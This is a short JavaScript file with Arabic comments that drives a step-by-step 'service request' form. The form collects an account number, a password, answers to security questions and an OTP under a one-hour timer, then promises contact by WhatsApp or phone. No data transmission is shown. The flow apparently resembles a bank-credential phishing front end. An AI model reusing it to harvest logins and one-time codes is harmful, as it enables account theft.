let timerInterval;

// 1. اختيار الخدمة والانتقال لخطوة الدخول
function selectService(serviceName) {
    document.getElementById("selected-service-title").innerText = "طلب: " + serviceName;
    showStep("step-login");
}

// 2. التحقق من الحساب وكلمة المرور والانتقال لأسئلة الأمان
function goToSecurityQuestions() {
    let acc = document.getElementById("accountNumber").value.trim();
    let pass = document.getElementById("password").value.trim();

    if (acc === "" || pass === "") {
        alert("يرجى إدخال رقم الحساب وكلمة المرور أولاً!");
        return;
    }

    showStep("step-security");
}

// 3. التحقق من أسئلة الأمان وبدء مؤقت الـ OTP لمدة ساعة (60 دقيقة)
function goToOTP() {
    let q1 = document.getElementById("secQ1").value.trim();
    let q2 = document.getElementById("secQ2").value.trim();

    if (q1 === "" || q2 === "") {
        alert("يرجى الإجابة على أسئلة الأمان أولاً!");
        return;
    }

    showStep("step-otp");
    startTimer(3600); // 3600 ثانية = 60 دقيقة (ساعة كاملة)
}

// 4. إتمام العملية
function completeProcess() {
    let otp = document.getElementById("otpInput").value.trim();
    if (otp === "") {
        alert("يرجى إدخال رمز التحقق OTP الذي وصلك!");
        return;
    }

    alert("تم استلام طلبك بنجاح! سيتم التواصل معك عبر الواتساب أو الاتصال قريباً.");
    location.reload(); // إعادة الفتح من البداية
}

// دالة التنقل بين الخطوات
function showStep(stepId) {
    document.querySelectorAll(".step-card").forEach(step => {
        step.classList.remove("active");
    });
    document.getElementById(stepId).classList.add("active");
}

// دالة العد التنازلي لمؤقت الـ OTP (ساعة)
function startTimer(durationInSeconds) {
    let timer = durationInSeconds;
    let countdownDisplay = document.getElementById("countdown");

    clearInterval(timerInterval);

    timerInterval = setInterval(function () {
        let minutes = parseInt(timer / 60, 10);
        let seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        countdownDisplay.textContent = minutes + ":" + seconds;

        if (--timer < 0) {
            clearInterval(timerInterval);
            alert("انتهت صلاحية الرمز، يرجى إعادة المحاولة مرة أخرى.");
            location.reload();
        }
    }, 1000);
}
